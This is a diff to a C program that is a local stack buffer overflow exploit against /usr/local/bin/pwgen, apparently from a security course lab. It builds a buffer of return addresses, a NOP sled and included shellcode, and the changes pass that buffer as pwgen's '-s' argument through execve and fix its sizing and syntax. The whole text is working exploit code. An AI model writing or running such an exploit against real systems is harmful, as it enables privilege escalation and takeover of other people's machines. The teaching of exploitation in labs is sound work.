@@ -7,8 +7,8 @@
 #include <unistd.h>
 #include </usr/local/src/shellcode.h>
 
-#define DBSIZE 1124
-#define doffset 0
+#define DBSIZE 2048
+#define DOFFSET 0
 #define TARGET "/usr/local/bin/pwgen"
 #define NOP   0x90
 unsigned long get_sp(void){
@@ -23,8 +23,8 @@ int main(int argc, char *argv[])
   char *addr_ptr, addr;
   // one way to invoke pwgen, system() creates a separate process
   int i;
-  int bsize = DBSIZE, int offset = DOFFSET;
-
+  int bsize = DBSIZE, offset = DOFFSET;
+  
 
   if(argc > 1) bsize = atoi(argv[1]);
     if(argc > 2) offset = atoi(argv[2]);
@@ -38,7 +38,7 @@ int main(int argc, char *argv[])
 
 
 
-  ptr = buf;
+  ptr = buf; 
   addr_ptr = (long *) ptr;
   for (i = 0; i < bsize; i+=4)
   *(addr_ptr++) = addr;
@@ -49,11 +49,15 @@ int main(int argc, char *argv[])
   for (i = 0 ; i <strlen(shellcode);i++)
       *(ptr++) = shellcode[i];
 
-    buf[bsize - 1] = '\0';
+    buf[bsize - 1] = '\0';//jump here. not overwrite here.
 
 
+
+  
+   
     args[0] = TARGET; args[1] = "-s";
-    args[2] = ""; args[3] = NULL;
+    args[2] = buf; 
+args[3] = NULL;
     env[0] = NULL;
   // execve() executes the target program by overwriting the
   // memory of the process in which execve() is executing, i.e.,
@@ -61,5 +65,8 @@ int main(int argc, char *argv[])
   if (execve(TARGET, args, env) < 0)
   fprintf(stderr, "execve failed.\n");
 
+
+
+//printf("%s %s %s",args[0], args[1],  args[2]);
   exit(0);
 }
